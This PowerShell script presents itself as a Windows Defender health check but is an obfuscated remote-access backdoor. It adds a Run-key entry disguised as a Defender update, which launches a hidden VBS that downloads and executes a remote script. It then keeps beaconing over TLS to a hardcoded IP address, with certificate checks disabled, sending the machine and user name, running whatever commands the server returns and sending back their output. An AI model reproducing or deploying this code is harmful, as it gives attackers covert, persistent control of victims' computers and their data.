# Windows Defender Health Check v2.1
$a1=([char[]](55,54,46,49,51,46,49,56,55,46,49,53,54))-join''
$a2=0x1BB
$a3=300;$a4=[int]($a3*.5)
$a5="$env:COMPUTERNAME\$env:USERNAME"
$a6=([char[]](72,69,76,76,79))-join''
$a7=([char[]](84,65,83,75))-join''
$a8=([char[]](82,69,83,85,76,84))-join''
$a9='Net.Soc'+'kets.T'+'cpClie'+'nt'
$b1='System'+'.IO.St'+'reamW'+'riter'
$b2='System'+'.IO.St'+'reamR'+'eader'
$b3='Net.Se'+'curi'+'ty.S'+'slSt'+'ream'
$rk='HKCU:\Soft'+'ware\Micro'+'soft\Wind'+'ows\Curre'+'ntVersion\Run'
$kn='MicrosoftDefenderUpdate'
if(!(Get-ItemProperty $rk -Name $kn -EA 0)){
    $pk=98
    $pe=@(10,22,22,18,17,88,77,77,16,3,21,76,5,11,22,10,23,0,23,17,7,16,1,13,12,22,7,12,22,76,1,13,15,77,37,16,11,15,54,10,7,48,11,18,18,7,16,79,49,45,49,39,33,55,48,39,77,16,7,6,79,22,7,17,22,77,16,7,4,17,77,10,7,3,6,17,77,15,3,11,12,77,17,20,1,10,13,17,22,61,23,18,6,3,22,7,61,20,80,76,18,17,83)
    $pa=($pe-join',')
    $pc='Start-Sleep 30;$k=98;$e=@('+$pa+');$u=[string]::Join('+[char]39+[char]39+',[char[]]($e|%{$_-bxor$k}));$t=[IO.Path]::GetTempPath()+'+[char]39+'s.ps1'+[char]39+';try{(New-Object Net.WebClient).DownloadFile($u,$t)}catch{};if(Test-Path $t){iex(gc $t -Raw)}'
    $vp="$env:APPDATA\Microsoft\Windows\WmiProv.vbs"
    'Set s=CreateObject("WScript.Shell"):s.Run "powershell -nop -ep bypass -c ""'+$pc+'""",0,False' | Out-File $vp -Encoding ASCII -Force -EA 0
    Set-ItemProperty $rk $kn ('wscript.exe "'+$vp+'"') -Force -EA 0
}
for(;;){
    $c1=$null
    try{
        $c1=New-Object $a9
        $c1.Connect($a1,$a2)
        $vc=[Net.Security.RemoteCertificateValidationCallback]{$true}
        $c2=New-Object $b3($c1.GetStream(),$false,$vc)
        $c2.AuthenticateAsClient($a1)
        $c3=New-Object $b1($c2);$c3.AutoFlush=$true
        $c4=New-Object $b2($c2)
        $c3.WriteLine($a6+'|'+$a5+'|'+$PID)
        $c5=$c4.ReadLine()
        $c6="$c5"-split'\|',3
        if($c6[0]-ceq$a7){
            if($c6[2]-match'^SLEEP\|(\d+(?:\.\d+)?)$'){
                $sh=[double]$matches[1]
                $sb=[int]($sh*3600)
                $sj=[int]($sb*0.1)
                $sd=$sb+(Get-Random -Min(-$sj) -Max($sj+1))
                $ack=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("sleeping $sh h (~$([int]($sd/60)) min)"))
                $c3.WriteLine($a8+'|'+$c6[1]+'|'+$ack)
                if($c1){$c1.Close();$c1=$null}
                Start-Sleep $sd
                continue
            }
            try{$c7=&([scriptblock]::Create($c6[2])) 2>&1|Out-String}
            catch{$c7='ERR: '+$_.Exception.Message}
            $c8=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($c7))
            $c3.WriteLine($a8+'|'+$c6[1]+'|'+$c8)
        }
    }catch{}finally{if($c1){$c1.Close()}}
    Start-Sleep($a3+(Get-Random -Min(-$a4) -Max($a4+1)))
}
